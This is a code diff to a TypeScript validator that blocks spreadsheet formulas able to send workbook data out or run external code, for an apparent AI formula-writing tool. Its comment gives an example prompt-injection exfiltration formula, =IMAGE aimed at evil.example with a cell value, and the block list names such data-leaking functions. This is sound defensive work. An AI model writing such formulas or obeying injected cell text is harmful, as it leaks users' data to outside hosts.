@@ -7,13 +7,26 @@ import { parseRange, type RangeRef } from "./a1";
 
 export const MAX_FORMULA_LENGTH = 8192; // Excel's own limit
 
-/** Functions we refuse to write: they reach outside the workbook. */
-export const BLOCKED_FUNCTIONS = new Set([
-  "WEBSERVICE", // makes HTTP requests — could leak sheet data
-  "RTD", // talks to real-time data servers
-  "CALL", // calls DLL functions (legacy XLM)
-  "REGISTER.ID",
-  "EXEC",
+/**
+ * Functions we refuse to write, with the reason. Each one can send workbook
+ * data outside the workbook (a network request, a cloud service, a file read)
+ * or run external code. A prompt injection hidden in cell text could otherwise
+ * get the model to write e.g. =IMAGE("https://evil.example/?d="&A1).
+ */
+export const BLOCKED_FUNCTIONS = new Map([
+  ["WEBSERVICE", "makes an HTTP request to any URL"],
+  ["IMAGE", "downloads from any URL, so the URL can carry cell data out"],
+  ["IMPORTTEXT", "reads a local file or URL"],
+  ["IMPORTCSV", "reads a local file or URL"],
+  ["COPILOT", "sends cell contents to an AI service that can search the web"],
+  ["TRANSLATE", "sends text to Microsoft's translation service"],
+  ["DETECTLANGUAGE", "sends text to Microsoft's translation service"],
+  ["STOCKHISTORY", "fetches data from the internet"],
+  ["PY", "runs Python code in Microsoft's cloud"],
+  ["RTD", "talks to a real-time data server"],
+  ["CALL", "calls DLL functions (legacy XLM)"],
+  ["REGISTER.ID", "registers DLL functions (legacy XLM)"],
+  ["EXEC", "runs a program (legacy XLM)"],
 ]);
 
 /** Functions we allow but flag, so the user takes a second look. */
@@ -99,11 +112,13 @@ export function scanFormula(formula: string): FormulaScan {
 
   const seen = new Set<string>();
   for (const m of masked.matchAll(FUNCTION_RE)) {
-    const name = m[1]!.toUpperCase().replace(/^_XLFN\./, "");
+    // Excel stores newer functions with prefixes like _xlfn. or _xlfn._xlws.
+    const name = m[1]!.toUpperCase().replace(/^(_XLFN\.|_XLWS\.)+/, "");
     if (seen.has(name)) continue;
     seen.add(name);
     scan.functions.push(name);
-    if (BLOCKED_FUNCTIONS.has(name)) scan.errors.push(`Function ${name} is blocked for safety`);
+    const blocked = BLOCKED_FUNCTIONS.get(name);
+    if (blocked) scan.errors.push(`Function ${name} is blocked for safety: it ${blocked}`);
     const warn = WARN_FUNCTIONS.get(name);
     if (warn) scan.warnings.push(`${name} ${warn}`);
   }
